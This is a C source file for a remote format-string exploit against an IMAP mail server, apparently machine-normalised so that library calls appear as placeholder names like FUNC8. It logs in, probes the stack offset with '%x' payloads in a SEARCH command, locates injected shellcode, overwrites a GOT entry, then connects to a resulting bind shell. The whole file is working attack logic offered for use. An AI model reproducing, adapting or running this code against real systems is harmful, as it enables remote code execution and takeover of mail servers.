#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  unsigned int u_int ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {unsigned short sin_port; int /*<<< orphan*/  sin_family; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int EOF ; 
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int /*<<< orphan*/  EXIT_SUCCESS ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC1 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,unsigned int,int,int) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 char* code ; 
 scalar_t__ FUNC5 (char*,struct sockaddr_in) ; 
 scalar_t__ FUNC6 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 struct hostent* FUNC10 (char*) ; 
 int FUNC11 (int,char**,char*) ; 
 int /*<<< orphan*/  got_entry ; 
 scalar_t__ FUNC12 (int) ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 
 scalar_t__ FUNC14 (TYPE_1__) ; 
 char* FUNC15 (int) ; 
 int /*<<< orphan*/  FUNC16 (TYPE_1__*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ optarg ; 
 scalar_t__ FUNC17 (int,char*,int) ; 
 int /*<<< orphan*/  FUNC18 (int,char*,...) ; 
 int /*<<< orphan*/  FUNC19 (int) ; 
 int FUNC20 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 scalar_t__ FUNC21 (char*,int) ; 
 scalar_t__ FUNC22 (scalar_t__) ; 
 int FUNC23 (char*) ; 
 scalar_t__ FUNC24 (char*,char*,int) ; 
 char* FUNC25 (char*,char*) ; 
 int /*<<< orphan*/  FUNC26 (int,char**) ; 
 int /*<<< orphan*/  FUNC27 () ; 

int FUNC28( int argc, char **argv )
{
  struct  hostent    *hp;
  struct sockaddr_in sin4;
  char shellbuf[1030];
  char *host, buffer[512], *ptr, *p, *USER, *PASS;
  int ch, port = 0, sock, offset = 1;
  int login  = 0, i, calc = 0;
  int ret = 0, len  = 0, b;
  int have_shell_loc = 0;
  unsigned int shell_addr = (u_int)0x0806c000;

  FUNC27( );

  if ( argc < 9 )
  { 
    FUNC26(argc, argv);
    FUNC7(EXIT_SUCCESS);
  }

  if (!(host = FUNC15 (128)))
  {
    FUNC8(stderr, "exp.c:115 Could not allocate memory\n");
    FUNC7(EXIT_FAILURE);
  }


  while((ch = FUNC11(argc, argv, "h:p:l:a:")) != EOF) 
  {
   switch(ch) 
   {
      case 'h':
      host = (char *)FUNC22(optarg);
      break;

      case 'V':
      break;

      case 'p':
      port =  FUNC1 (optarg);
      break;
 
      case 'l':
      USER = (char *)optarg;
      break;

      case 'a':
      PASS = (char *)optarg;
      break;

      default:
      FUNC26(argc, argv);
      break;
 }	
}


 
  if ((sock = FUNC20(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
  {
    FUNC8(stderr, "exp.c:139 Error creating an new socket"); 
    FUNC7(EXIT_FAILURE);
  }

  host = (host) ? host : "localhost";
  port = (port) ? port : 143;

  if (!(FUNC0(host)))
  {
     if (!(hp = FUNC10(host)))
     {
       FUNC8(stderr, "exp.c:152 Could not resolve ip address\n");	
       FUNC7(EXIT_FAILURE);
     } 

     FUNC16(&sin4.sin_addr,hp->h_addr,hp->h_length);
     host = (char *)FUNC22(FUNC14(sin4.sin_addr)); 
  } else 
    sin4.sin_addr.s_addr = FUNC13(host);

 


  sin4.sin_family = AF_INET;
  sin4.sin_port = (unsigned short)FUNC12( port );

  FUNC8(stdout, "[+] Connecting to %s:%d\n", host,port);

  if ((FUNC6(sock, (struct sockaddr *)&sin4,sizeof(struct sockaddr))) < 0)
  { 
     FUNC8(stderr, "[*] exp.c:178 Connection failed\n");
     FUNC7(EXIT_FAILURE);
  }


  FUNC8(stdout, "[+] Connected .. \n");
  FUNC8(stdout, "[+] Sending login ... \n");

  FUNC18(sock, "1 LOGIN %s %s\r\n", USER, PASS);
  FUNC8(stdout, "[+] Done ... \n");

  while ((FUNC17(sock, buffer, 512)) > 0)
  {
    if ( login == 0  && ret == 0)
    switch (buffer[0])
    {

     case '1':
     FUNC8(stdout, "[+] Selecting inbox ..\n");
     FUNC18(sock, "2 Select inbox\n");
     FUNC8(stdout, "[+] Selecting Done .. Starting brute sequence\n");
     FUNC18(sock, "3 search topic .AAAABBBB%%%d$x\n",offset);
     login = 1;
     break;
    }


    if ((ptr=FUNC25(buffer, "(near")) && login == 1)
    {
      ptr +=15;
      if ((FUNC24(ptr, "41414141",8))!=0) 
      {
        offset ++;
        FUNC18(sock, "3 search topic .AAAABBBB%%%d$x\n",offset);
      }
      else 
      {
        FUNC8(stdout, "[+] Found offset %d\n", offset);
	FUNC8(stdout, "[+] Finding buffer on the stack\n");
	ret = 1;
	login = 0;
        FUNC3(buffer);
      }
    } 

    if ( ret == 1 )
    {
	
      if ((ptr=FUNC25(buffer, "(near"))) 
      {
        ptr +=6+4 +1; /* +4 for the addr string*/
	/* +1 for the junk char */
	calc = FUNC23(buffer) - FUNC23(ptr);
	calc -=6+4+1;	
	
	for (i = 0; i < FUNC23(buffer); i++) 
        {  
           if ( (FUNC24(ptr, code, FUNC23(code)))==0 && have_shell_loc !=1)
           {
	     shell_addr += i -4;
	     have_shell_loc = 1;
	     FUNC19(2);
             FUNC2(got_entry, shell_addr+=3, offset, sock);
             FUNC8(stdout,"[+] Decoy found at %u\n", shell_addr);
       	     FUNC4(sock);
	     FUNC8(stdout, "[+] Trying to contact the bind shell ..\n");
    	     if((FUNC5(host, sin4)) < 0)
	       FUNC8(stderr, "[-] Exploit failed\n");
           } 
           else
             ++ptr;
        } 
      }      
      if( shell_addr > 0xc0000000)
        break;
      shell_addr++;
      ptr = ((char *)&shell_addr);
      ptr[4] = 0;
      if ( FUNC21(ptr, 0xa) || FUNC21(ptr, 0xd) || ptr[0]==0x00) 
      {
        shell_addr ++;
        ptr = ((char *)&shell_addr);
        ptr[4] = 0;
      } 
      while (FUNC23(ptr) !=4)
      {
        shell_addr++;
        ptr = ((char *)&shell_addr);
        ptr[4] = 0;
      }
      if (have_shell_loc != 1)
      {
        FUNC18(sock, "3 search topic .%s....%%%d$s%sCCCC\n",ptr,offset,code);
      }
    }
    FUNC3(buffer);
  }

  FUNC8(stderr, "[+] Closing connection\n");
  FUNC4(sock);
  FUNC9(host);

  FUNC8(stderr, "[-] Exploit failed %u\n", shell_addr);
  return 0;
}